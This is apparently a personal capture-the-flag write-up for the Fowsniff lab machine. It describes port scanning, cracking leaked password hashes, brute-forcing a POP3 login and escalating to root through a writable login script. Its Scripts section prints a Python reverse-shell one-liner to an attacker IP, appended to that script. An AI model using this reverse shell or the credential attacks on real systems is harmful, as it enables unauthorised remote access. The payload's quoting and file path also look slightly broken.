# Fowsniff ctf

Use this template for documenting your Capture The Flag challenge solutions. Duplicate this page for each new challenge you solve.

## Challenge Information

**Challenge Name:** Fowsniff CTF

**Category:** Linux

**Difficulty:** *Easy*

**Points: 450**

**Date Solved: 20th Nov 2025**

---

## Challenge Walkthrough

- Using nmap scan the machine and fine open ports

![Screenshot from 2025-11-26 19-31-01.png](Fowsniff%20ctf/Screenshot_from_2025-11-26_19-31-01.png)

- Using Google, can you find any public information about them? http://10.80.133.191

![Screenshot from 2025-11-26 19-38-54.png](Fowsniff%20ctf/Screenshot_from_2025-11-26_19-38-54.png)

- Using Google, can you find any public information about them?

![image.png](Fowsniff%20ctf/image.png)

- README FILE available after finding the website source code

![image.png](Fowsniff%20ctf/image%201.png)

![Screenshot from 2025-11-26 20-03-14.png](Fowsniff%20ctf/Screenshot_from_2025-11-26_20-03-14.png)

- The pastebin link is no longer accessible

![image.png](Fowsniff%20ctf/image%202.png)

- Use the wayback machine to access the url and used hashcat to decode the hashes

![image.png](Fowsniff%20ctf/a79b2ec3-baf1-438c-b530-90b513efbcbe.png)

![image.png](Fowsniff%20ctf/image%203.png)

- Using the usernames and passwords you captured, can you use metasploit to brute force the pop3 login?
- What was seina's password to the email service?
- Connect to the pop3 service with her credentials and find email information that you gather?

![image.png](Fowsniff%20ctf/image%204.png)

- Looking through her emails, and find a temporary password set for her
- In the email, who send it? Using the password from the previous task and the senders username, connect to the machine using SSH

![image.png](Fowsniff%20ctf/image%205.png)

- Once connected, what groups does this user belong to? Are there any interesting files that can be run by that group?
- The file [cube.sh](http://cube.sh) contains read and write

![image.png](Fowsniff%20ctf/image%206.png)

- We also find a file that can updated

![image.png](Fowsniff%20ctf/image%207.png)

- Reverse shell. update the [cube.sh](http://cube.sh) file and input a python script and logout the user
- start netcart to trigger the reverse shell and login the user. Find the roof flag which is in the root

![Screenshot from 2025-11-27 00-36-48.png](Fowsniff%20ctf/Screenshot_from_2025-11-27_00-36-48.png)

---

---

---

### Key Findings

### Scripts

```python
echo 'python3 -c "import socket,os;s=socket.socket();s.connect((/"192.168.130.114"/,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.system(\"/bin/sh -i\")"' >> /opt/cube/cube.s
```

---

## Flag

![image.png](Fowsniff%20ctf/image%208.png)